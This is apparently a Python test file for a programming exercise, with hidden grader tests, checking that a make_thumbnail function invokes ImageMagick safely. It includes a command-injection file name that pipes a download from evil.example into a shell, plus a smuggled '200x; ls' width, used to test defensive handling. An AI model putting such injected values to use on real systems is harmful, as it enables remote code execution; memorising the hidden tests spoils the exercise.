import subprocess

from plp import hidden, raises, test
from solution import make_thumbnail


class FakeRun:
    """Stands in for subprocess.run: records each call, and can fail like check=True would."""

    def __init__(self, returncode=0):
        self.calls = []
        self.returncode = returncode

    def __call__(self, args, **kwargs):
        self.calls.append((args, kwargs))
        if kwargs.get("check") and self.returncode:
            raise subprocess.CalledProcessError(self.returncode, args)
        return subprocess.CompletedProcess(args, self.returncode, "", "")

    @property
    def args(self):
        return self.calls[-1][0]

    @property
    def kwargs(self):
        return self.calls[-1][1]


EVIL = "uploads/photo.jpg; curl https://evil.example/x.sh | sh; #.jpg"


@test("A malicious file name is passed as one argument, with no shell")
def _():
    run = FakeRun()
    make_thumbnail(EVIL, 200, run=run)
    assert run.args == ["magick", EVIL, "-resize", "200x", "uploads/photo.jpg; curl https://evil.example/x.sh | sh; #-thumb.jpg"]
    assert not run.kwargs.get("shell"), "don't pass shell=True"


@test("Builds the argument list and returns the thumbnail path")
def _():
    run = FakeRun()
    assert make_thumbnail("uploads/photo 1.jpg", 200, run=run) == "uploads/photo 1-thumb.jpg"
    assert run.args == ["magick", "uploads/photo 1.jpg", "-resize", "200x", "uploads/photo 1-thumb.jpg"]


@test("Fails loudly and can't hang")
def _():
    run = FakeRun()
    make_thumbnail("uploads/logo.png", 120, run=run)
    assert run.kwargs.get("check") is True, "pass check=True so a failed resize raises"
    assert run.kwargs.get("timeout") is not None, "pass a timeout"
    assert run.kwargs["timeout"] <= 120


@test("A width that isn't a positive whole number is refused before running")
def _():
    run = FakeRun()
    raises(ValueError, make_thumbnail, "uploads/a.jpg", "200x; ls", run=run)
    raises(ValueError, make_thumbnail, "uploads/a.jpg", 0, run=run)
    assert run.calls == []


@hidden("A failed resize raises CalledProcessError")
def _():
    raises(subprocess.CalledProcessError, make_thumbnail, "uploads/broken.jpg", 200, run=FakeRun(returncode=1))


@hidden("Floats, negative numbers and booleans are refused too")
def _():
    run = FakeRun()
    for width in (200.5, -40, True):
        raises(ValueError, make_thumbnail, "uploads/a.jpg", width, run=run)
    assert run.calls == []
